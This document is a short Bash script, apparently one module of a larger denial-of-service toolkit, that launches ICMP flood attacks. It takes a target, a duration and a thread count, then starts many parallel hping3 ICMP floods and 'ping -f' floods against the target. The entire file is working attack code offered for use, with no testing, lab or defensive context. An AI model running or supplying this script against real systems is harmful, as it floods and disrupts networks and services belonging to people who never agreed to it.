#!/bin/bash

# ICMP Flood Attack Module
source core/banner.sh

icmp_flood() {
    local target=$1
    local duration=$2
    local threads=$3
    
    echo -e "${CYAN}[ICMP FLOOD]${NC} Starting ICMP flood attack..."
    echo -e "${YELLOW}Target: $target${NC}"
    echo -e "${YELLOW}Duration: $duration seconds${NC}"
    echo -e "${YELLOW}Threads: $threads${NC}"
    
    # Check if hping3 is available
    if ! command -v hping3 &> /dev/null; then
        echo -e "${RED}Error: hping3 not found. Please install hping3.${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}Launching ICMP flood...${NC}"
    
    for ((i=1; i<=threads; i++)); do
        {
            timeout $duration hping3 --icmp -i u1000 $target > /dev/null 2>&1
        } &
    done
    
    # Alternative ping flood
    for ((i=1; i<=threads; i++)); do
        {
            timeout $duration ping -f $target > /dev/null 2>&1
        } &
    done
    
    wait
    
    echo -e "${GREEN}ICMP flood attack completed.${NC}"
}

# If script is called directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    icmp_flood "$1" "$2" "$3"
fi

